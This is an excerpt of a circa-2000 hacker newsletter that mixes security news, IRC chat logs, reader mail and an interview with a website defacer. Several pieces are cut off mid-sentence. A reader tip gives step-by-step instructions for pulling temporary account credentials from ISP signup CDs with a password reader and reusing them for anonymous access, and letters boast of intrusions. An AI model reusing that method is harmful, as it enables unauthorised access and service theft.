  ** Regarding the people on the email notification list with listbot.
  
     We now have a new listserv system setup with help from the generous
     people of the CCC (Chaos Computer Club) in Germany. If you haven't
     heard of CCC or don't know who they are you've been living under a
     rock ;)
     
     I am still working on the system it may or may not be ready for use 
     as of this release, certainly it should be accessible for the next
     one, soon you will be able to receive the newsletter/zine directly
     delivered to your inbox (yay!). Stay tuned - Ed
     
  
  
  Early one night in #Hwa.hax0r.news ...
  
  <SugarKing> Cruciphux: so do you really need help? cause I can start getting
              articles for ya if you want/need them
  <Cruciphux> yes
  <Cruciphux> damnit
  <Cruciphux> I do need help
  <SugarKing> so what do I do.....look for articles...copy and paste them.....
              then hand them to you?
  <Cruciphux> what do you want to do? 
  <Cruciphux> if you wanna do that sure, email em to me like that
  <Cruciphux> must have a source and or url though
  <SugarKing> ok
  <Cruciphux> ppl always forget urls/sources and I can't print it without a 
              source
  <Cruciphux> if u do and I haven't already put the info in you 'win' a 
              Contributed by: space sn00zer! line under the article
  <Cruciphux> :)
  <SugarKing> hehe
  <Cruciphux> and if yer good at it and get stuff I've never seen (like isn't
              on my excite newsbot list or on HNN etc) then you get
  <Cruciphux> promoted to 'staff'
  <Cruciphux> etc
  <Cruciphux> I should put this in there actually so ppl know what to expect
  <SugarKing> ok cool
  <Cruciphux> and original articles? i'd kill for good original material
  <SugarKing> heh
  <Cruciphux> stress on the 'good' but i'm not too picky if someone wants to make
              a fool of themselves in public.
  <Cruciphux> :-o
  <SugarKing> so what kinda of articles.....anything? from programming to 
              hacking....etc?
  <Cruciphux> pretty much
  <SugarKing> heh
  <Cruciphux> technology, radio, science if it has a techno slant, and of course 
              internet/web security and hacking related
  <Cruciphux> u know the drill
  <SugarKing> yeah
  <Cruciphux> also
  <SugarKing> just checkin...
  <SugarKing> heh
  <Cruciphux> I need someone to do 'research' on web site defacements
  <Cruciphux> an adjunct to what attrition does
  <Cruciphux> like tell me about interesting defacements, I just print the sites
              list i get from attrition
  <SugarKing> like how....person who defaced......??.......??
  <SugarKing> ohh ok
  <Cruciphux> theres a mailing list you can get on that tells you when sites get
              cracked
  <Cruciphux> thats a biggie i'm gonna be asking for in this issue
  <Cruciphux> print the 'good' defacements (shit with an angle) and track down/
              identify defacers and groups
  <Cruciphux> etc
  <SugarKing> ok cool:)
  <Cruciphux> with an eye towards possible profiles (group) and interviews 
              (if they're doing something interesting)
  <Cruciphux> anything else?
  <SugarKing> that looks good:)  
  <SugarKing> it doesn't seem that hard when you hear about people doing it
  <Cruciphux> k lemme know if you wanna do anything and lemme know what you want 
              to do etc
  <SugarKing> but now it sure seems harder than expected
  <Cruciphux> heh
  <SugarKing> but it'll give me something to do at least
  <Cruciphux> well I do everything myself right now in free time and there are 
              areas that i'd like to follow up on nad I just don't have the time
  <Cruciphux> so if ppl are willing to help i can keep putting out and hopefully
              things will get better too.
  <SugarKing> well....I'll do anything you want me to do.....but following up on
              defacements and getting articles seems good right now
  <Cruciphux> otherwise i'd have to think about either downsizing or closing down
              and I don't want to do that really.
  <Cruciphux> ok good stuff
  <Cruciphux> local and 'small' stuff like whats going on at your schools computer
              lab ie: security policies is good angles for writing your own stuff
              too if that tickles your fancy
  <Cruciphux> doesn't have to be major world news
  <Cruciphux> *g*
  <SugarKing> ok

  Patching IE Security, Yet Again 


  Security vulnerability affects the Win 2000 browser. 

  Windows 2000 is finally here. And so is a patch for a security vulnerability 
  in the Internet browser that is bundled with the new operating system. 
  Microsoft issued the patch on Wednesday, the eve of the release of its 
  much-delayed operating system.

  The bug, which Microsoft calls the Image Source Redirect vulnerability, makes 
  it possible for a malicious Web site operator to read certain types of files 
  on the computers of visitors using Internet Explorer versions 4.0, 4.01, 5.0, 
  and 5.01.

  This means that the iteration of IE that is distributed with Windows 2000, 
  version 5, also is affected by the bug.

  When you want to view a new page with a different domain than the one 
  currently being viewed, a Web server sends the page to your IE browser window. 
  IE then checks the server's permissions on the new page.

  The vulnerability makes it possible for a Web server to open a browser window 
  to a file stored on the IE user's computer, and then switch to a page in the 
  server's domain, gaining access to the contents of the user's files in the 
  process, Microsoft says in a statement.

  Any data that can be seen is accessible only for a short period of time, and 
  the Web site operator would need to know, or guess, the names and locations of 
  files. The operator would also be able to view only file types that can be 
  opened in a browser window, including .txt files, Microsoft says.

   SYNOPSIS (READ THIS)
   --------------------
   
   The purpose of this newsletter is to 'digest' current events of interest
   that affect the online underground and netizens in general. This includes
   coverage of general security issues, hacks, exploits, underground news
   and anything else I think is worthy of a look see. (remember i'm doing
   this for me, not you, the fact some people happen to get a kick/use
   out of it is of secondary importance).

    This list is NOT meant as a replacement for, nor to compete with, the
   likes of publications such as CuD or PHRACK or with news sites such as
   AntiOnline, the Hacker News Network (HNN) or mailing lists such as
   BUGTRAQ or ISN nor could any other 'digest' of this type do so.

    It *is* intended  however, to  compliment such material and provide a
   reference to those who follow the culture by keeping tabs on as many
   sources as possible and providing links to further info, its a labour
   of love and will be continued for as long as I feel like it, i'm not
   motivated by dollars or the illusion of fame, did you ever notice how
   the most famous/infamous hackers are the ones that get caught? there's
   a lot to be said for remaining just outside the circle... <g>

    WANTED!: POSTCARDS! YESH! POSTCARDS, I COLLECT EM so I know a lot of you
    ~~~~~~~  are reading this from some interesting places, make my day and 
             get a mention in the zine, send in a postcard, I realize that 
             some places it is cost prohibitive but if you have the time and
             money be a cool dude / gal and send a poor guy a postcard 
             preferably one that has some scenery from your place of 
             residence for my collection, I collect stamps too so you kill
             two birds with one stone by being cool and mailing in a postcard,
             return address not necessary, just a  "hey guys being cool in
             Bahrain, take it easy" will do ... ;-) thanx.



    Ideas for interesting 'stuff' to send in apart from news:

    - Photo copies of old system manual front pages (optionally signed by you) 
    - Photos of yourself, your mom, sister, dog and or cat in a NON
      compromising position plz I don't want pr0n. <g>
    - Picture postcards
    - CD's 3.5" disks, Zip disks, 5.25" or 8" floppies, Qic40/80/100-250
      tapes with hack/security related archives, logs, irc logs etc on em.
    - audio or video cassettes of yourself/others etc of interesting phone
      fun or social engineering examples or transcripts thereof.
    
    
    Stuff you can email:
    
    - Prank phone calls in .ram or .mp* format
    - Fone tones and security announcements from PBX's etc
    - fun shit you sampled off yer scanner 
    - reserved for one smiley face ->        :-)            <-
    - PHACV lists of files that you have or phac cd's you own (we have a burner)
    - burns of phac cds (email first to make sure we don't already have em)
    - Any and all telephone sounds/tones/beeps/trunk drops/line tests/etc 
    

    If you still can't think of anything you're probably not that interesting
    a person after all so don't worry about it <BeG>

     i have a few phone sounds that you might be interested in.. 
 
     cycle tone sweeper, switch verification messages, unidentifiable
     messages, those recordings that say a bunch of numbers, spit out touch
     tones and hang up, test messages, etc.
 
     less interesting than the above, but i also have recordings of some odd
     error messages, loops, blue box tones, red box tones, touch tones,
     ccitt5, a call from a jail.
 
     when applicable, the filename is the actual phone number i called to
     recieve the sound. 
 
     unfortunately they are not in ram nor mp3 formats but..
 
     you can find my collection at 
 
                         hope that helps,

      YOU'LL NEED:
      Windoze (I'm sorry!)
      A PWL Reader (TIP: get the demo version of pwltool @ www.webdon.com)
      One of them ISP CD's with the M$ Internet Connection Wizzard
      
      HOW DOES IT WORK:
      
      For the ones that don't know that the internet connection wizzard is, i'll 
      explain quickly. Since ISP's are constantly dying to get new members, they 
      (sometimes) give away free CD's with magazines and stuff. All ICW does is 
      make a temporary connnection to a server, get some HTML, run Internet 
      Explorer in fullscreen and have you fill in some stupid forms which will 
      be CGI'd to the administration so you'll get your internet accout... and 
      the bill. Filling in false info can be usefull, but won't work long + it's 
      illegal.

      For the temporary connection to the server ICW just makes a new Dial-up 
      connection. So what you need to do             is just boot up one of them 
      CD's, make that connection, alt+tab away and use the PWL Reader to get the 
      temporary info for the account.

      Cancel your subscribing and throw away the CD. The connection gets deleted 
      from your dialup's automaticly to prevent       such abuse.

      Load up your normal internet connection and go to that ISP's website. Go 
      for technical support and get the       nearest PoP. (Read: telephone 
      number to log in).

      Now make a new dialup connection with that number and the login name and 
      password you just earned with the PWL       reader. Voilla. You're 
      connected. (Note: these are usually guest/guest or stuff like that).

      Try reaching a external website (i.a. www.news.insource.nl). If can't 
      connect it probably means the ISP was smart       and blocked all external 
      traffic for the sign up account.

      I've tried this on several ISP's and it worked most of the time. Some 
      ISP's were smart enough to block such jokes       but some weren't. Since 
      free internet is a fact these days this is only usefull to remain 
      anonymous. (if you're hacking or something).

     First I want to say the zine is kickass.
     SugarKing pointed me to the lastest one.  Read it last nite at work.  That 
     really sux that Fuqrag was raided.  I work at a place where he did a 
     defacement and maybe some other stuff.  ;)  Since then, I have been 
     interested about what else he was doing.  Only could catch the latest 
     defacements, though.  I get a good laugh at work when the servers go down<of 
     course NT> and say "FUQRAG IS BACK!"  They freak!  haa haa so funny it 
     really pisses them off.  They won't listen to me about our networks security 
     since I am only a pc tech. and they are big MSCE's.  I thought MSCE's had to 
     know their shit?  They set up a ftp server and told everyone that it didn't 
     allow anonymous log in, ha, should've seen their faces when some good pics 
     should up in their personal directories. After they still hadn't figured out 
     who it was, I told them how to fix that problem.  What do you know, the next 
     day my admin rights were gone,<can't even add machines to the domain> and 
     the test account another admin setup for me was gone.  Even showed them 
     problems with asp.  It's just pissing them off and they are not doing 
     anything about it.  Not even patching old holes.   Very discouraging for me, 
     when I can show them how to fix their shit.  You would think after being 
     hacked they would do something.  reading the interview with fuqrag was some 
     kewl shit.  I hope they take it easy on em.  I hope he writes some articles 
     for the zine, too.  Anyway I just wanted to let you know that the zine kicks 
     ass and content is good.  I wish to be as 313373 as fuqrag!!
     
     Keep up the great work

       I'm originally from Italy. So, If you ever came across something to

       I'd like to keep a very-very low profile. No profile at all would even be 
      better. 
      Just my 2 Cents.
      You're doing a wonderful job...

      Subject: kyxquestions: @home puke
     
     
      Here are more puzzles for all you armchair hacker sleuths...
      
      In the last two days my cablemodem has started spewing ICMP Host Unreachable
      packets from a local 10.11.* address to seemingly random addresses but each
      address is repeated multiple times.  Most of the dest hosts are in 207.230.246.*
      We are talking about lots of packets here... every couple of min.
      
      This was preceeded by the unusual occurrence of 10.11.* -> 10.11.* traffic.
      Which was followed by mapping and poking at random 10.11.* addresses
      from varied addresses.  10.11 is where @ home puts their cablemodems.
      As to why I would be seeing this stuff on the client side of my cablemodem
      that's a good question - expecially those 10.11 -> 10.11 packets. I haven't
      ruled out some flaky modem or router yet blasting garbage into the ether, and
      @home has been having to "reboot their servers" a lot lately.
      
      Other wierd stuff is broadcasts from 10.11.* hosts on port 121 to subnet
      broadcast addresses.
      
      Looking back into the logs shows that this kind ICMP storm has happened in the
      past weeks on and off a couple of times.  Interestingly, before today... the
      destination was always in the 172.16.*.* address space. Each time, the activity
      starts, is heavily active and then stops within minutes.... only today it seems
      to be going on and not abating and it seems to like destinations of
      207.230.246.[170,253] (what looks like a name server {woop, woop, danger will
      robinson} and a test box at vsb.bc.ca and 24.112.31.56 and 172.16.6.195 (no
      reverse dns lookup avail) as it's favorite destinations.  Todays activity seems
      to all come from one cablemodem and the activity in the past seemed to vary in
      source modem address. The single source says to me that it may just
      be one flaky modem.
      
      Now I gotta go and find where the whois registry for the ca domain hides.
      
      Miscelaneous crud:
      
      24.113.85.105 cr547339-a.surrey1.bc.wave.home.com  which seems to be running
      some sort of port-1080-wingate sort of thing has been trying to log in to an ftp
      server here, when he oughtn't.
      
      And lots and lots of the typical wingate scans and along with oodles of the not
      so common yet Trin00/TrojanCow/DeepThroat 3.1 traffic/scans. Anybody got 
      a good rundown/synopsis of DeepThroat or Trojan Cow they can point me to?
      I have to go see what ArachNIDS says. BTW for those that are keeping score
      Trojan Cow seems to be the winner in the number of hosts infected dept.
      if the # of different sources of the broadcasts and volume are any indication.
      
      Bottom line:
       
      Something is wierd and new. We also had a runaway lynx process on one
      server.... now I hear there is a new remote overflow in it (Safer) - but that is
      just circumstancial evidence. That plus another potentially false outbound xterm
      trigger all leads to the old spidey senses saying...  fee fi fo fum... I smell
      hacking.    
      
      P.p.s.  for Max and the rules guys... outbound nmap TCP connect scans seem to
      false the "AOL chat data" rules in snort, not sure if that's in vision.conf or
      rapidnet set yet but I find this a useful falsing that lets me log outbound
      nmaps I initiate. :-)

05.0 WebTV hit by "Melissa-Type" virus

     WebTV hit by Melissa-like bug 
     By Stephanie Miles
     Staff Writer, CNET News.com
     March 17, 2000, 3:55 p.m. PT 

     WebTV has been hit by a self-replicating bug that is wreaking havoc 
     with the network's message boards and newsgroups, a situation that 
     knocks back the company's claim that it is immune to viruses and 
     security holes. 

     The problem, which some are calling the "Flood Virus," gets inside
     the e-mail system of WebTV owners and prompts the WebTV settop box
     to litter bulletin board and newsgroup sites on the company's 
     network with redundant junk mail. Like the Melissa virus, the 
     malicious WebTV code sends out the emails under a user's name 
     without their knowledge. 

     Melissa-type viruses cause damage by clogging email servers of 
     corporations and organizations with illegitimate emails. For 
     WebTV users, the chief problem so far has come in trying to read
     the intra-network web sites. Bulletin boards on the WebTV network
     only show five postings at a time. An outbreak of the Flood Virus
     therefore makes it very difficult for users to find relevant 
     messages on the board. 

     Subscribers also face potential embarrassment, as emails under 
     their name are posted to newsgroups without their knowledge. 

     Microsoft, which owns WebTV, has confirmed the existence of the
     problem but claims the situation is a hack rather than a virus.
     The company added that the problem is not widespread. 

     Whatever the root cause of the problem, the situation is black eye
     for the service. One of WebTV's marketing pitches has been that 
     subscribers do not have to worry about rogue viruses on the Internet. 

     Microsoft also has had a tempestuous relationship with segments of
     its subscriber base over technological issues in the past. After 
     gaining attention as the first firm to offer Internet service through
     the television, WebTV has struggled to build its subscriber base and 
     has encountered criticism from users for failing to support standard 
     Web technologies such as Java. The company was acquired by Microsoft
     in 1997. 

     WebTV was recently forced to reverse course and remove banner ads 
     from emails viewed and stored on the site in response to a flood of
     customer complaints. The backlash comes as WebTV faces a looming 
     challenge from Internet service giant America Online, which is set
     to launch its AOL TV sometime this summer. 

     The problem was first discovered by Net4TV, which tracks interactive
     television. Net4TV came up with the Flood Virus name. 

     "It's absolutely self-replicating. It inserts the virus code into the
     signature upon opening the email or going to the newsgroup," said 
     Brian Bock, editor in chief at Net4TV. 

     The general public does not have to worry about the flaw. It can only
     come in e-mails from WebTV units and it only effects other WebTV boxes.
     In addition, all of the excess mail is currently being directed at 
     newsgroups and bulletin boards on the company's network. 

     The WebTV network is written mainly in HTML, and the company uses HTML
     shortcuts for certain network features, according to Net4TV. Shortcuts
     within user's email signature files, the calling card at the bottom of
     an e-mail message, serve as the entryway for the malicious code. The 
     code manipulates the signature file and then prompts the Web TV unit 
     to post repeatedly to WebTV newsgroups. 

     WebTV representatives could not confirm this account of how the network
     is set up. Nonetheless, they acknowledged it exists. 

     "It's a fundamental flaw in the WebTV architecture," Bock said. 

     Although WebTV currently counts about one million subscribers, Microsoft
     is marketing portions of the service along with its TV Pak to cable 
     service providers as Microsoft TV. If portions of the WebTV browser are
     easily susceptible to these types of attacks, Bock said, it does not bode
     well for Microsoft TV if it is installed on a widespread basis through 
     cable providers. 

     "It points to a larger problem," he said, calling for an independent 
     security analysis of the WebTV architecture, similar to that which took
     place with Microsoft's Hotmail free email service after suffering repeated
     privacy breaches. "It points to what else may be going on under there." 

     For its part, WebTV says the problem has only hit a very small number of
     WebTV Classic users. According to Microsoft, hackers combined two known 
     WebTV hacks: one which inserts malicious code into the user's email 
     signature file, and one which inserts malicious code into postings on 
     the newsgroup itself. 

     "These two codes were linked together," a spokesperson said, asserting 
     that only 14 of the 594,000 WebTV Classic users have reported being 
     infected with the bug. WebTV had previously created fixes for the two
     separate problems when they originally surfaced. The company is working
     on a more comprehensive patch to be released next week. 

     In the meantime, users should open their signature file to check if any
     new text or code has been inserted, the WebTV representative said.

     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
     By Cruciphux
     
     BlaznWeed contacted me regarding commenting on some of the things Sect0r said
     in the interview last issue, so we address those and get a general interview
     as well... mildly edited to remove general chatter. - Ed
     
     
     
     Interview date: Sun Mar 19/2000
     By: Cruciphux

     [15:28] <Cruciphux> i'll do the preliminary intro questions ...
     [15:28] <Cruciphux> like age interest group affiliations etc
     [15:28] <BlaznWeed> i'm 20 and my group is wkD     
     [15:29] <Cruciphux> whats wkD stand for?
     [15:29] <Cruciphux> and how long has it been around?
     [15:29] <BlaznWeed> wicked
     [15:29] <Cruciphux> how many members and where are they based?
     [15:29] <Cruciphux> how did you meet? irc?
     [15:29] <Cruciphux> :
     [15:29] <BlaznWeed> there are many members
     [15:30] <BlaznWeed> and i don't know them all
     [15:30] <Cruciphux> some in other groups too?
     [15:30] <BlaznWeed> I got introduced to wkD by zeroc
     [15:30] <BlaznWeed> who is the founder
     [15:30] <BlaznWeed> I don't think so
     [15:30] <BlaznWeed> but i can't say for sure
     [15:30] <BlaznWeed> he hangs on dalnet mostly
     [15:31] <Cruciphux> you too?
     [15:31] <BlaznWeed> yeah
     [15:31] <Cruciphux> why dalnet? any reason?
     [15:31] <BlaznWeed> Most of my freinds are on dalnet
     [15:31] <Cruciphux> how long have you been on the net?
     [15:32] <BlaznWeed> about three four years
     [15:32] <BlaznWeed> to
     [15:32] <Cruciphux> how long have you been into computers? same time or 
                         longer?
     [15:32] <BlaznWeed> the nets is relatively new here in the uk
     [15:32] <BlaznWeed> longer
     [15:32] <BlaznWeed> about six maybe 7
     [15:33] <Cruciphux> how would you classify yourself? ie: hacker cracker
                         coder scriptkid <sic>
     [15:33] <Cruciphux> and do you code? if so in what?
     [15:33] <BlaznWeed> hehe 
     [15:33] <BlaznWeed> yes i do code
     [15:34] <BlaznWeed> but i haven't written my own exploits yet
     [15:34] <Cruciphux> oh I forgot 'defacer'
     [15:34] <Cruciphux> :)     
     [15:34] <BlaznWeed> i'm a full time computer science student
     [15:34] <BlaznWeed> i suppose i'd be labeled a cracker
     [15:34] <Cruciphux> so you break into sites but don't deface all of them?
     [15:35] <BlaznWeed> If i manage to break into a unix box i don't defeace 
                         them
     [15:35] <Cruciphux> about how many have you done? 
     [15:35] <BlaznWeed> simply because i have other uses for them
     [15:35] <Cruciphux> and how long have you been doing it?
     [15:35] <BlaznWeed> but the N boxes i have no use for
     [15:35] <Cruciphux> nod
     [15:36] <BlaznWeed> maybe a couple of years now
     [15:36] <BlaznWeed> i started of hacking nothing but unix boxes
     [15:36] <Cruciphux> what is your home machine? if more than one box whats 
                         your setup?
     [15:36] <BlaznWeed> I actually enjoy playing hide a nd seek with admins
     [15:36] <Cruciphux> heh
     [15:36] <Cruciphux> battle of wits
     [15:37] <BlaznWeed> I'm just running linux at home 
     [15:37] <BlaznWeed> but i used to eun solaris
     [15:37] <BlaznWeed> but the thing with solaris is that it doesn't run very 
                         well on x86 proccesssors
     [15:38] <BlaznWeed> so i'm stuck with linux until i can afford a sparc
     [15:38] <Cruciphux> I don't like solaris 
     [15:38] <BlaznWeed> solaris and linux are like blondes and brunettes i like
                         em both
     [15:38] <BlaznWeed> :D
     [15:38] <Cruciphux> and its worse on x86 processors
     [15:39] <Cruciphux> what about *BSD?
     [15:39] <Cruciphux> its closer to real unix than linux*
     [15:39] <BlaznWeed> I haven't tried that
     [15:39] <BlaznWeed> though  i do have a couple of bsd shells
     [15:39] <BlaznWeed> legit ones mind
     [15:40] <Cruciphux> without giving details outline a typical hack, ie: what
                         do you use as a base point, do you use pbx or redirectors
                         to dial into hacked accts etc, what country do you use etc
     [15:40] <BlaznWeed> yeah i notice
     [15:41] <BlaznWeed> no comment
     [15:41] <Cruciphux> hehe
     [15:41] <Cruciphux> damn that was the most interesting too
     [15:41] <Cruciphux> :)
     [15:41] <BlaznWeed> :)
     [15:43] <BlaznWeed> well i suppose this interview gives me the perfect 
                         opportunity to address some of the misleading comments
                         written by secto0r in the last issue of hwa     
     [15:43] <Cruciphux> I was about to approach that
     [15:43] <Cruciphux> initially sect0r said he and you were 'ok' after the 
                         defacement log incident
     [15:44] <BlaznWeed> yeah i thought we were ok too
     [15:44] <BlaznWeed> "He" claims i'm a wannabe with no skills,
     [15:44] <BlaznWeed> this is funny since it was only the other day he asked me
     [15:44] <BlaznWeed> to deface a web site for him
     [15:45] <Cruciphux> hrm
     [15:45] <BlaznWeed> "He" claims he could have redefaced my stuff easily
     [15:45] <BlaznWeed> this is funny again since he had to come and ask me to do
                         his chores.
     [15:45] <Cruciphux> yeah in the interview he said     
     [15:45] <Cruciphux> [20:03] <sect> i had someone akicked from #hackers on dalnet, 
     [15:45] <Cruciphux>                the kid retaliated, what can i say?
     [15:45] <BlaznWeed> And even if he did know how to redeface my stuff he wouldn't 
                         have gotten
     [15:45] <BlaznWeed> very far since I patched all the box's I hacked.
     [15:45] <Cruciphux> [20:04] <sect> that would be blazinweed, he is basically a 
     [15:45] <Cruciphux>                wannabe with no skills to speak of.     
     [15:45] <Cruciphux> [20:04] <sect> i would have re-defaced his stuff easily 
     [15:45] <Cruciphux>                (nt boxen), but i'm not down with that 
                                        anymore.
     [15:45] <Cruciphux> ...
     [15:45] <BlaznWeed> He also highlights the fact
     [15:45] <BlaznWeed> that they were only NT boxes that were defaced well
                         i'd like to respond to this by saying i only deface 
                         NT boxes because i have no use for them but the unix
                         boxes I keep btw he runs windows :D
     [15:45] <Cruciphux> good point
     [15:46] <BlaznWeed> I'd also like to say a few things about the plusmail 
                         exploit
     [15:46] <BlaznWeed> that he and ytcracker talked about. I've never heard
                         so much bull ever.
     [15:46] <BlaznWeed> the Hole was found by Herf (of wkD which is my group
                         also) 
     [15:46] <Cruciphux> but people take notice of defacements because they 
                         are 'public' and summarily judge people in the 'scene'
                         by their web 'hacks'
     [15:46] <BlaznWeed> and all it required was a simple html file that you 
                         loaded in your browser
     [15:46] <BlaznWeed> which then allowed you to bypass the login screeen on 
                         dumb servers running plusmail.btw the scanner was 
                         written by ytcracker and it was useless anyway since
                         next to no servers run the vulnerable package and the
                         ones that do have long since patched it.
     [15:47] <BlaznWeed> This is the reason you didn't see it get a slot at 
                         securityfocus.

     [15:48] <BlaznWeed> hrm
     [15:49] <Cruciphux> have you confronted sect0r about his comments?
     [15:49] <Cruciphux> if so what happened
     [15:49] <Cruciphux> if not why not
     [15:49] <Cruciphux> :)
     [15:49] <BlaznWeed> he left before i could
     [15:50] <BlaznWeed> someone found all his personel info
     [15:50] <Cruciphux> nod I'm aware of that
     [15:50] <BlaznWeed> and he is gone to hide
     [15:52] <Cruciphux> anything else you'd like to say? there isn't that much we

08.0 2600 activism against the MPAA      
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
     http://www.2600.com/
     http://www.2600.com/news/2000/0130.html
     
     February 2, 2000

     FOR IMMEDIATE RELEASE
     
     DAY OF ACTION PLANNED AGAINST MOTION PICTURE ASSOCIATION IN 100 CITIES
     
     Members of the hacker and open source communities worldwide, along with
     various civil liberties groups, are planning a massive leafletting
     campaign on Friday, February 4 to call attention to the recent attempts
     by the Motion Picture Association of America to shut down thousands of
     websites. 
     
     Lawsuits have been filed against hundreds of people, as well as an Internet
     Service Provider and a magazine, for having information the MPAA wants
     to keep secret.
     
     The controversy centers around a computer program known as DeCSS, thought to
     be written by a 16 year old in Norway. The program defeats the encryption 
     scheme used by DVD's which prohibits them from being viewed on non-approved
     machines or computers. It also enables DVD's from one country to be
     played in another, contrary to the wishes of the movie industry. It does
     NOT facilitate DVD piracy - in fact, copying DVD's has been possible
     since their introduction years ago. In its press releases on the subject,
     the MPAA has claimed that this is a piracy issue and they have subsequently
     succeeded in getting injunctions against a number of sites that had 
     posted the program in the interests of free speech.
     
     This is in effect a lawsuit against the entire Internet community by
     extremely powerful corporate interests. The lawsuit and the various
     actions being planned promise to be a real showdown between two increasingly
     disparate sides in the technological age. The consequences of losing this
     case are so serious that civil libertarians, professors, lawyers, and a
     wide variety of others have already stepped forward to help out.
     
     Friday's action will be coordinated in 74 cities throughout North America
     and 26 cities in other parts of the world. Leafletting will take place
     outside theaters and video stores in these cities - all of which 
     participate in a monthly "2600" gathering. 2600 Magazine has been named
     in two lawsuits regarding the DeCSS program and has joined with the
     the growing number of people who will fight these actions by the MPAA
     until the end.
     
     The lawsuit has been filed by the Motion Picture Association of America,
     Columbia/Tristar, Universal City Studios, Paramount Pictures, Disney
     Enterprises, Twentieth Century Fox, Metro-Goldwyn-Mayer Studios, and
     Time Warner Entertainment.

     leaflet campaign:
     ~~~~~~~~~~~~~~~~~
     
     CALL TO ACTION 

     01/30/00 

     Thousands of copies of the flyer have already
     been distributed at movie theaters worldwide. Versions are also being made 
     in different languages. The next step will involve a massive action this 
     Friday, February 4, 2000. 

     We call on all 2600 meetings held around the world on that day to head to 
     the local theaters and spread the word of this travesty of justice by 
     handing out as many flyers as possible. Everyone is invited to show up and 
     participate, bring your friends, tell your local Linux User Group, spread 
     the news to any organization you're part of, and join us in advocating 
     justice. We find that once people are made aware of the facts of the case, 
     they become as outraged as we have. 

     TIPS FOR HANDING OUT FLYERS First, make sure you make the flyers 
     distinctive by printing on colored paper if at all possible. The quickest 
     way to do this is to go to a copy shop. Get several hundred at the very 
     least - you WILL go through them quickly. Make sure you can print more if 
     you need them. 

     Familiarize yourself with the facts of the case as presented on 
     www.opendvd.org. It's important to be able to answer questions of people 
     who are interested in learning more. Remember, this is NOT about DVD piracy 
     - that is how the movie industry is trying to portray this case. The issue 
     here is CONTROL of players - whether you have the right to play DVD's on 
     the computer of your choice and whether you should be able to see DVD's 
     from other countries. As well as our freedom to continue reporting on the 
     events, developments and discoveries of the hacker community, in a full and 
     accurate manner. 

     We find that people respond well to "Protect Your Rights" as a catch phrase 
     to get them to take the flyer. Let us know if others work for you. Be 
     courteous to the people passing by - don't block their path and, if they 
     ignore you or even make a snide remark, don't heckle them. We find that the 
     vast majority of people are polite and interested in what you have to say. 
     You'll find that some will even come up to you asking for more flyers! Have 
     a set of master copies (printed on white paper) for others to make copies 
     of their own and hand out in other places. 

     If you are asked to leave by theater management, cooperate and ask them 
     where they would like you to stand. They can't force you to leave the area, 
     only the part that is their property. You can still successfully hand out 
     material to everyone coming and going by positioning yourself in 
     neighboring areas or even in the parking lot. If things become unpleasant, 
     simply head to another theater in a different part of town. (If you run out 
     of theaters, you can always fall back on video stores.) We find that 90% of 
     such confrontations can be averted by befriending security guards and 
     making it clear that you don't intend to be disruptive.

09.0 Microsoft sends magazine full versions of Windows 2000
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

     http://www.pcwelt.de/content/news/newwindows/2000/03/xn160300005.html
     
     Microsoft gave away inadvertently 100,000 Windows-2000-Kopien in the 
     value of approximately 33 million dollar to private users. How the 
     Spanish intelligence service Brujula.com reports, Microsoft wanted to
     actually pack on 120 days the limited version of the operating system
     on booklet DS, those approximately 100,000 outputs of the Spanish 
     PC WELT sister " PC World " supplements. Afterwards it turned out 
     however that it concerned at the software a temporally unlimited 
     version inclusive Registrations code. 

     Thus 100,000 installations of Windows are 2000 without license in 
     the circulation. And with a selling price of 330 dollar per copy 
     might have developed for Microsoft a financial damage of 33 million
     dollar. 

     Who caused the error, is not certain officially. Insider assume 
     however not the magazine, but Microsoft is responsible for the 
     breakdown. Some whisper even, Microsoft 
     
     -=-
     
     
     Win 2000 gratis auf CD

     Microsoft hat versehentlich 100.000 Windows-2000-Kopien im Wert von
     rund 33 Millionen Dollar an private Anwender verschenkt. Wie der
     spanische Nachrichtendienst Brujula.com berichtet, wollte Microsoft
     eigentlich die auf 120 Tage limitierte Version des Betriebssystems auf
     Heft-CDs packen, die rund 100.000 Ausgaben der spanischen
     PC-WELT-Schwester "PC World" beilagen. Im Nachhinein stellte sich
     jedoch heraus, dass es sich bei der Software um eine zeitlich unbegrenzte
     Version inklusive Registrations-Code handelte.

     Damit sind 100.000 Installationen von Windows 2000 ohne Lizenz im
     Umlauf. Und bei einem Verkaufspreis von 330 Dollar pro Kopie drfte
     Microsoft ein finanzieller Schaden von 33 Millionen Dollar entstanden sein.

     Wer den Fehler verursacht hat, steht offiziell noch nicht fest. Insider gehen
     jedoch davon aus, dass nicht die Zeitschrift, sondern Microsoft selbst fr
     die Panne verantwortlich ist. Manche munkeln sogar, Microsoft habe die
     Vollversion absichtlich auf die CDs gepackt, um die Verkaufszahlen von

      Card Alert for French Banks

      By Catherine Bremer

      PARIS (Reuters) - France braced for a wave of petty fraud after officials 
      admitted on Friday that a formula posted on the Internet showed how to 
      forge smart payment cards.

      But Cartes Bancaires, the French interbank group whose card system is 
      affected, said there was no danger that bank accounts would be emptied.

      Cards made with the formula might be used to buy train tickets or pay 
      parking meters or toll booths although there was no evidence this had 
      actually happened, Cartes Bancaires spokesman Herve de Lacotte told 
      Reuters.

      ``For the first time in 10 years, a lock has been sprung,'' he said. ``But 
      springing a lock will not necessarily open the door and let you in. There 
      is a theoretical risk of fraud but the problem concerns banks, not 
      consumers or shops.''

      Despite claims to the contrary, Lacotte said, false cards made with the 
      code could not be used in cash dispensers, to make shop purchases or for 
      expensive goods.

      Newspapers leaped on the story, quoting experts as saying the complex 
      96-digit code could be used to forge three in four of France's 34 million 
      bank cards.

      Headlines like ``Chip card secret out'' left anyone with a bank card 
      wondering whether their money was safe.

      ``Consumers have been paying for bank cards that aren't even secure. 
      They've been cheated and lied to,'' said Eric April, Secretary-General of 
      the AFOC consumer group.

      Lacotte said the scare stories were over the top and the Bank of France 
      accused the press of ``exaggerating the risk.''

      ``Even if certain clues relating to this algorithm have been made 
      public... other security measures exist enabling strong limits on the use 
      that can be made of this information,'' the French central bank said in a 
      statement.

      Cards issued since last autumn had added security which meant the pirate 
      formula would not work for them, he added.

      SCSSI, the government body in charge of information security systems, 
      urged banks to replace older cards with updated ones.

      The card formula was posted anonymously on Internet chat site last 
      weekend. It was actually discovered three years ago by computer whizz kid 
      Serge Humpich, who denies using it or circulating but has been given a 
